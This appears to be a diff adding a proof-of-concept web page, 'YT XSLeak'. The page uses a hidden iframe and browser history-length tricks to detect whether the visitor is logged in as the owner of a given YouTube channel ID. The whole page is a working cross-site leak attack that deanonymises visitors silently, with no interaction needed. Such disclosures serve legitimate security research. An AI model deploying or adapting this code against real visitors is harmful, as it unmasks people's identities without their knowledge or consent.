@@ -1,0 +1,70 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+  </head>
+  <body>
+    <h1>
+      YT XSLeak
+    </h1>
+    <p>
+      Enter a YT channel ID and this page can check if it is you (does not actually require user interaction)
+    </p>
+    <form id="form">
+      <input id="inp" type="text" name="inp" placeholder="UClOf1XXinvZsy4wKPAkro2A"></input>
+      <button id="btn" type="submit">Go</button>
+    </form>
+    <div id="output"></div>
+    <iframe
+      style="visibility: hidden;"
+      height="0"
+      width="0"
+      id="test"
+      src="about:blank"
+    ></iframe>
+    <script>
+      async function isLocation(w, url) {
+        await new Promise((resolve) => setTimeout(resolve, 50));
+        let start = w.history.length;
+        w.history.back();
+        await new Promise((resolve) => setTimeout(resolve, 500));
+        w.location = url;
+        await new Promise((resolve) => setTimeout(resolve, 500));
+        w.location = "about:blank";
+        await new Promise((resolve) => setTimeout(resolve, 50));
+        let diff = w.history.length - start;
+        w.history.go(-1 - diff);
+        return diff === 0;
+      }
+      async function checkNavigation(startUrl, endUrl) {
+        test.src = startUrl;
+        await new Promise((resolve) => setTimeout(resolve, 500));
+        let state = await isLocation(test.contentWindow, endUrl);
+        return state;
+      }
+      async function checkYT(id) {
+        return await checkNavigation(
+          "https://studio.youtube.com/channel/invalid",
+          `https://studio.youtube.com/channel/${id}`
+        );
+      }
+
+      async function main() {
+        console.log("main called");
+        const formData = new FormData(document.getElementById("form"));
+        const channelId = formData.get("inp");
+
+        console.log("probing...");
+        const output = document.getElementById("output");
+        output.innerText = "probing...";
+        const result = await checkYT(channelId);
+        output.innerText = `${result}`;
+      }
+      const form = document.getElementById("form");
+      form.addEventListener("submit", (event) => {
+        event.preventDefault();
+        main();
+      });
+    </script>
+  </body>
+</html>
